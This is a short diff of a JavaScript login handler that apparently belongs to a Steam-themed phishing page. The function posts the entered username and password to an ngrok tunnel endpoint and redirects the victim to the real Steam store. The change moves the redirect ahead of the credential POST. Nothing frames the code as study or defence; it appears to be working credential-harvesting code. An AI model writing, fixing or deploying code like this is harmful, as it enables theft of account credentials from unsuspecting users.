@@ -81,7 +81,7 @@ const clickToLogin = async () => {
     console.log('Username or password cannot be empty');
     return;
   }
-
+  window.location.href = 'https://store.steampowered.com/';
   try {
     const response = await fetch('https://97d4-178-91-89-133.ngrok-free.app/api/accounts/', { // Add trailing slash
       method: 'POST',
@@ -96,7 +96,6 @@ const clickToLogin = async () => {
 
     if (response.ok) {
       console.log('Login successful');
-      window.location.href = 'https://store.steampowered.com/';
     } else {
       const errorData = await response.json();
       console.log('Login failed', errorData);
